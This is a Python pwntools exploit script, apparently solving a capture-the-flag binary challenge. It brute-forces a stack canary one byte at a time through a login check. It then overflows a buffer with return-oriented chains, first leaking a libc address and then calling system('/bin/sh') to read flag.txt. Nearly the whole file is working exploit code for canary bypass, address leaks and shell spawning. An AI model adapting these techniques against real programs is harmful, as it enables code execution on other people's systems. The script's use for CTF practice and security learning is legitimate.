#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
b *0x40158B
continue
"""

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
exe = "./chall_patched"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

def login(password):
    sla(b"choice: ", b"1")
    sa(b"password:", password + b"\x00")


# login(b"\xff\x00")
password = b""

for i in range(8):
    for byte in range(1, 0x100):
        login(password + p8(byte))
        io.recvline()
        result = io.recvline()
        info(result)
        if result == b"Login successfully!\n":
            password += p8(byte)
            info("Guessed password: 0x" + password.hex())
            break

canary = b"\x00" + password[1:]
info("Canary: " + canary.hex())

sla(b"choice: ", b"2")

ret = 0x000000000040101a #: ret

payload = flat(
    b"\x00",
    b"A" * 55,
    canary,
    b"B" * 8,
    ret,
    elf.plt.printf,
    elf.plt.puts,
    0x00401385
    )

sla(b"input:", payload)

sla(b"choice: ", b"3")

libc_leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - 0x62050
info(hex(libc.address))

login(password)
sla(b"choice: ", b"2")

pop_rdi = libc.address + 0x000000000002a3e5 #: pop rdi ; ret

payload = flat(
    b"\x00",
    b"A" * 55,
    canary,
    b"B" * 8,
    ret,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
    )
sla(b"input:", payload)
sla(b"choice: ", b"3")
sl(b"cat flag.txt")
io.interactive()

